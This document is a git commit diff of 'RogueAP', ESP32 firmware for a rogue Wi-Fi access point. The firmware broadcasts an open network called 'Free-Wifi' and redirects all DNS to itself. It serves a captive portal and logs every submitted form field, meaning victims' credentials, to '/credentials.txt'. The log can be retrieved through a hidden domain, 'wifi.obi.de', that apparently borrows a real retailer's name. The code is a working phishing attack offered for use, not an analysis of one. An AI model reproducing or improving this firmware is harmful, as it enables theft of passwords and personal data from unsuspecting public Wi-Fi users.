390e2ac8ae941adb9a272924022cbbe8f3b83f5d
David Fischer <backfuscher@gmail.com>
2024-01-29 15:05:11 +0100

    JSON fixed

--- RogueAP.ino
+++ RogueAP.ino
@@ -1,11 +1,11 @@
 /*
- * RogueAP for ESP32
- * version 0.1 (05/19/2018)
- * 
- * - Act as fake access point 
- * - Respond all DNS queries with own IP
- * - Provide captive portal
- */
+   RogueAP for ESP32
+   version 0.1 (05/19/2018)
+
+   - Act as fake access point
+   - Respond all DNS queries with own IP
+   - Provide captive portal
+*/
 
 
 #include <WiFiClient.h>
@@ -16,16 +16,17 @@
 #include <SPIFFS.h>
 #include <detail/RequestHandlersImpl.h>
 #include <ArduinoJson.h>
+#include "default.html"
 
 #define CONFIG_FILE "/config.json"
 #define MAX_PORTALS 10
 
 // struct for the global config
 struct CONFIG {
-  String activePortal;
-  String logFileName;
-  String ssid;
-  String configDomain;
+  String activePortal = "/default.html";
+  String logFileName = "/credentials.txt";
+  String ssid = "Free-Wifi";
+  String configDomain="wifi.obi.de";
   uint8_t numStoredPortals;
   String availablePortals[MAX_PORTALS];
 } config;
@@ -34,26 +35,41 @@ struct CONFIG {
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 1, 1);
 DNSServer dnsServer;
-
+JsonDocument doc;
+JsonDocument json;
 ESP32WebServer server(80);
 
 /*
- * SETUP
- * - enable serial (for DEBUG output)
- * - enable SPIFFS
- * - load config from flash file system (SPIFFS)
- * - enable Wifi and AP mode
- * - enable DNS
- * - enable webserver
- */
+   SETUP
+   - enable serial (for DEBUG output)
+   - enable SPIFFS
+   - load config from flash file system (SPIFFS)
+   - enable Wifi and AP mode
+   - enable DNS
+   - enable webserver
+*/
 void setup() {
-
-  Serial.begin(250000); 
+  Serial.print("setup()");
+  Serial.begin(250000);
 
   // start flash file system and load config from JSON file
-  SPIFFS.begin();
-  loadConfig();
-  
+  if(!SPIFFS.begin(true)){
+        Serial.println("An Error has occurred while mounting SPIFFS");
+        return;
+   }
+  File root = SPIFFS.open("/");
+ 
+  File f = root.openNextFile();
+ 
+  while(f){
+ 
+      Serial.print("FILE: ");
+      Serial.println(f.name());
+ 
+      f = root.openNextFile();
+  }
+  // loadConfig();
+
   // Enable AP mode
   WiFi.mode(WIFI_AP);
   WiFi.softAP(config.ssid.c_str());
@@ -63,46 +79,47 @@ void setup() {
   // if DNSServer is started with "*" for domain name, it will reply with
   // provided IP to all DNS request
   dnsServer.start(DNS_PORT, "*", apIP);
-    
+
   /* register callback function for webserver */
   server.on("/", servePortal);              // usual request
   server.on("/logfile.txt", serveLogFile);  // get 'secret'logfile
   server.on("/config", configPage);         // config page
 
   server.onNotFound(handleUnknown);
-  
+
   /* start web server */
   server.begin();
   Serial.println("\n\nHTTP server started");
-
+  
   /* write a line into the logfile to indicate the startup */
   File file = SPIFFS.open(config.logFileName, FILE_APPEND);
-  if(!file){
+  if (!file) {
     Serial.println("- failed to open file for appending");
     return;
   }
   file.println("--- restart ---");
-  
+
 }
 
 /*
- * Main program loop
- * - process DNS requests
- * - process HTTP requests
- */
+   Main program loop
+   - process DNS requests
+   - process HTTP requests
+*/
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
 }
 
 /*
- * send the 'secret' logfile
- */
+   send the 'secret' logfile
+*/
 void serveLogFile() {
+  Serial.print("serveLogFile()");
   // verify that the request was made with the correct config url
-  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader());Serial.println("#");
+  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader()); Serial.println("#");
   if (!server.hostHeader().equals(config.configDomain)) {
-    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain);Serial.println("#");
+    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain); Serial.println("#");
     servePortal();
     return;
   }
@@ -113,11 +130,12 @@ void serveLogFile() {
 
 // serve the captive portal page
 void servePortal() {
+  Serial.print("servePorta()");
   // are there any arguments? in case yes, it seems like the user already clicked submit
   if (server.args() > 0) {
     // go through all arguments
     String logEntry;
-    for (uint8_t i=0; i<server.args(); i++) {
+    for (uint8_t i = 0; i < server.args(); i++) {
       logEntry += server.argName(i) + ": " + server.arg(i) + "   ";
     }
     logEntry += "\n";
@@ -125,9 +143,9 @@ void servePortal() {
 
     // write all arguments to the logfile
     File file = SPIFFS.open(config.logFileName, FILE_APPEND);
-    if(!file){
-        Serial.println("- failed to open file for appending");
-        return;
+    if (!file) {
+      Serial.println("- failed to open file for appending");
+      return;
     }
     file.print(logEntry);
   }
@@ -138,110 +156,59 @@ void servePortal() {
 
 // Trying to load scripts from SPIFFS
 void handleUnknown() {
-  String filename = "/scripts";
+  Serial.print("handleUnkown()");
+  String filename = "";
   filename += server.uri();
+  Serial.print(filename);
   serveFile(filename.c_str());
 } // End handleUnknown
 
 void serveFile(const char* fileName) {
-  File pageFile = SPIFFS.open(fileName, "r");
+  Serial.print("serveFile()");
+  File pageFile = SPIFFS.open(fileName, FILE_READ);
   if (pageFile && !pageFile.isDirectory()) {
     String contentTyp = StaticRequestHandler::getContentType(fileName);
-    server.sendHeader("Cache-Control","public, max-age=31536000");
+    server.sendHeader("Cache-Control", "public, max-age=31536000");
     size_t sent = server.streamFile(pageFile, contentTyp);
     pageFile.close();
   }
   else
-//    notFound();
-  servePortal();
+    servePortal();
 }
-
-// load the config stored in a json file
-bool loadConfig() {
-  File configFile = SPIFFS.open(CONFIG_FILE, "r");
-  if (!configFile) {
-    Serial.println("Failed to open config file");
-    return false;
+/*
+   Check the flash (SPIFFS) for available portals (single page HTML files)
+*/
+void checkAvailablePortals() {
+  Serial.print("checkAvailablePortals()");
+  File root = SPIFFS.open("/portals");
+  if (!root) {
+    Serial.println("Failed to open directory");
+    return;
   }
-
-  size_t size = configFile.size();
-  if (size > 1024) {
-    Serial.println("Config file size is too large");
-    return false;
+  if (!root.isDirectory()) {
+    Serial.println("Not a directory");
+    return;
   }
-
-  // Allocate a buffer to store contents of the file.
-  std::unique_ptr<char[]> buf(new char[size]);
-
-  configFile.readBytes(buf.get(), size);
-
-  StaticJsonBuffer<200> jsonBuffer;
-  JsonObject& json = jsonBuffer.parseObject(buf.get());
-
-  if (!json.success()) {
-    Serial.println("Failed to parse config file");
-    return false;
+  config.numStoredPortals = 0;
+  File file = root.openNextFile();
+  while (file) {
+    if (!file.isDirectory()) {
+      config.availablePortals[config.numStoredPortals] = file.name();
+      config.numStoredPortals++;
+    }
+    file = root.openNextFile();
   }
-
-  // copy to active config
-  config.activePortal = String((const char*) json["activePortal"]);
-  config.logFileName = String((const char*) json["logFileName"]);
-  config.ssid = String((const char*) json["ssid"]);
-  config.configDomain = String((const char*) json["configDomain"]);
-  return true;
-}
-
-// safe the current config to a json file in SPIFFS
-bool saveConfig() {
-  StaticJsonBuffer<200> jsonBuffer;
-  JsonObject& json = jsonBuffer.createObject();
-  json["activePortal"] = config.activePortal;
-  json["logFileName"] = config.logFileName;
-  json["ssid"] = config.ssid;
-  json["configDomain"] = config.configDomain;
-  
-  File configFile = SPIFFS.open(CONFIG_FILE, "w");
-  if (!configFile) {
-    Serial.println("Failed to open config file for writing");
-    return false;
-  }
-
-  json.printTo(configFile);
-  return true;
 }
 
 /*
- * Check the flash (SPIFFS) for available portals (single page HTML files)
- */
-void checkAvailablePortals(){
-    File root = SPIFFS.open("/portals");
-    if(!root){
-        Serial.println("Failed to open directory");
-        return;
-    }
-    if(!root.isDirectory()){
-        Serial.println("Not a directory");
-        return;
-    }
-    config.numStoredPortals = 0;
-    File file = root.openNextFile();
-    while(file){
-        if(!file.isDirectory()){
-            config.availablePortals[config.numStoredPortals] = file.name();
-            config.numStoredPortals++;
-         }
-        file = root.openNextFile();
-    }
-}
-
-/*
- * 'secret' config page
- */
+   'secret' config page
+*/
 void configPage() {
+  Serial.print("configPage()");
   // verify that the request was made with the correct config url
-  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader());Serial.println("#");
+  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader()); Serial.println("#");
   if (!server.hostHeader().equals(config.configDomain)) {
-    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain);Serial.println("#");
+    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain); Serial.println("#");
     servePortal();
     return;
   }
@@ -249,10 +216,22 @@ void configPage() {
   // Check whether there are arguents or not. In case yes, store the configuration. If not, show the config page
   if (server.args() > 0) {
     // go through all arguments
-    if (server.hasArg("portal")) { config.activePortal = server.arg("portal"); config.activePortal.trim(); }
-    if (server.hasArg("ssid")) { config.ssid = server.arg("ssid"); config.ssid.trim(); }
-    if (server.hasArg("logFile")) { config.logFileName = server.arg("logFile"); config.logFileName.trim(); }
-    if (server.hasArg("configDomain")) { config.configDomain = server.arg("configDomain"); config.configDomain.trim(); }
+    if (server.hasArg("portal")) {
+      config.activePortal = server.arg("portal");
+      config.activePortal.trim();
+    }
+    if (server.hasArg("ssid")) {
+      config.ssid = server.arg("ssid");
+      config.ssid.trim();
+    }
+    if (server.hasArg("logFile")) {
+      config.logFileName = server.arg("logFile");
+      config.logFileName.trim();
+    }
+    if (server.hasArg("configDomain")) {
+      config.configDomain = server.arg("configDomain");
+      config.configDomain.trim();
+    }
 
     /* DEBUG */
     Serial.print("PORTAL: "); Serial.println(config.activePortal);
@@ -261,7 +240,7 @@ void configPage() {
     Serial.print("ConfigDomain: "); Serial.println(config.configDomain);
 
     // save config to flash
-    saveConfig();
+    // saveConfig();
 
     // send http ok message
     String html;
@@ -276,7 +255,7 @@ void configPage() {
     html += "</body></html>";
     server.send(200, "text/html", html);
     return;
-    
+
   } else {        // show config page
     // see what portals are available
     checkAvailablePortals();
@@ -338,10 +317,7 @@ void configPage() {
     html += "  </div>";
     html += "</body>";
     html += "</html>";
-  
+
     server.send(200, "text/html", html);
   }
 }
-
-
-
